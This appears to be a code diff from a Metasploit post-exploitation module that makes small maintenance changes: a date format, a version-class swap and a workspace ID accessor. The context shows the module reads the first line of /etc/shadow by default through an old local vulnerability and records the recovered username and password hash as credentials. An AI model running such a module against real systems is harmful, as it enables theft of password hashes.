@@ -30,7 +30,7 @@ class MetasploitModule < Msf::Post
           ['EDB', '30021'],
           ['BID', '23915']
         ],
-        'DisclosureDate' => 'May 07 2007',
+        'DisclosureDate' => '2007-05-07',
       ))
     register_options([
         OptString.new('FILE', [true, 'File to read the first line of', '/etc/shadow'])
@@ -54,8 +54,8 @@ class MetasploitModule < Msf::Post
       return false
     end
 
-    version = Gem::Version.new($1.split(".").map(&:to_i).join('.'))
-    unless version.between?(Gem::Version.new('3.2.3'), Gem::Version.new('3.2.4'))
+    version = Rex::Version.new($1.split(".").map(&:to_i).join('.'))
+    unless version.between?(Rex::Version.new('3.2.3'), Rex::Version.new('3.2.4'))
       print_error "#{version} is not vulnerable"
       return false
     end
@@ -96,7 +96,7 @@ class MetasploitModule < Msf::Post
     credential_data = {
       origin_type: :session,
       session_id: session_db_id,
-      workspace_id: myworkspace.id,
+      workspace_id: myworkspace_id,
       post_reference_name: self.fullname,
       username: formatted_output.split(':')[0],
       private_data: formatted_output.split(':')[1],
